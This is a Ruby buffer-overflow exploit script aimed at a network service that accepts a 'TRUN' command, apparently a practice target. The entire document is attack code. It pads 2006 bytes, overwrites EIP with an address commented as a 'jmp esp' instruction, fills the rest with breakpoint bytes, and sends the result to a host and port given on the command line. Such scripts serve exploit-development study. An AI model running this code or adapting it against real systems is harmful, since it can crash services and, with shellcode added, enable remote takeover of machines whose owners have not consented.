#!/usr/bin/env ruby

require 'net/http'

buffer = "\x41" * 2006
eip = "\xAF\x11\x50\x62" #Memory Address 62 50 11 AF , OP code for jmp esp  FFE4
rest = "\xcc" * (3000 - (buffer + eip).size)

exploit = buffer + eip + rest

host = ARGV[0]
port = ARGV[1]

s = TCPSocket.open(host, port)
s.recv(1024)
s.send("TRUN ." + exploit, 0)
s.close

#-> Exploit Info

puts "[+] " + "Buffer length: " + "#{exploit.size} bytes."
puts "[+] Done"